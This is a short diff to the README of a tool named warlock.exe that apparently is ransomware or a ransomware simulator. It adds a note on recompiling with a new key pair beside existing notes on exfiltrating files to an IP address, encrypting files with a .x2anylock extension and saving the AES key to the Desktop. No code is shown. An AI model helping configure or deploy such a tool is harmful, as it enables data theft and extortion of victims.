@@ -47,6 +47,8 @@ warlock.exe -m <mode> [options]
   ```
   
 Notes:  
+  - warlock.exe and warlocklnx.exe are compiled with the keys uploaded to the repository. To use a new pair of keys, generate it, paste to priv_key.txt and to publicKeyPEM parameter, and compile a new executable
+
   - Option to exfiltrate files to the specified ip address 
   - Encrypted files will have the extension .x2anylock
   - AES key is saved to Desktop as YOUR_KEY.txt
